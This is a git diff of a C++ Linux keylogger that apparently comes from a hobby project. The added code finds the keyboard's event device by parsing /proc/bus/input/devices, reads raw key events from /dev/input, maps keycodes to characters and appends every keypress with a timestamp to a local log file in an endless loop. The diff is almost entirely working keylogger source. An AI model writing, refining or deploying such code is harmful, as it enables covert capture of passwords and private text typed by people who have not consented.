@@ -2,7 +2,6 @@
 #include <linux/input.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <map>
 #include <fstream>
 #include <ctime>
 using namespace std;
@@ -22,11 +21,38 @@ int main(){
            \______/                       \______/                     
 )" << endl;
 
-    bool con = true; //condition for loop to continue
-    struct input_event ev; // this is a standard linux data structure used to represent events
-    int fd = open("/dev/input/event3",O_RDONLY); //here I used open and put in it the path and use O_RDONLY for reading file only
+    string line;
+
+    ifstream check;
+    check.open("/proc/bus/input/devices");
+    string event = "";
+    bool found = false;
+    while (getline(check , line))
+    {
+        if(line.find("N:") != string::npos && line.find("eyboard") != string::npos){
+            found = true;
+        }
+        if( found && line.find("H:") != string::npos){
+            size_t pos = line.find("event");
+            event = line.substr(pos);
+            event = event.substr(0, event.find_first_of(" \n\r\t"));
+            break;
+        }
+    }
+    
+    check.close();
+    
+    struct input_event ev;
+    string path = "/dev/input/"+event;
+    int fd = open(path.c_str(),O_RDONLY);
+
+    if (fd == -1){
+        cout << "Permission denied" ;
+        exit(1);
+    }
     fstream write;
-    map<int ,string> keymap; // this is a library that keycodes charcaters
+    string keymap[256];
+
     keymap[1]= "ESC";
     keymap[2]= "1";
     keymap[3]= "2";
@@ -100,7 +126,7 @@ int main(){
 
      write.open("keylog1.txt" , ios::app); // this line creates file and appends to it when keylogger is on
 
-    while(con == true){
+    while(true){
         read(fd , &ev , sizeof(ev)); // so am using read to read from fd and put it in &ev
         if(ev.type == EV_KEY && ev.value == 1){
             time_t now = time(nullptr);
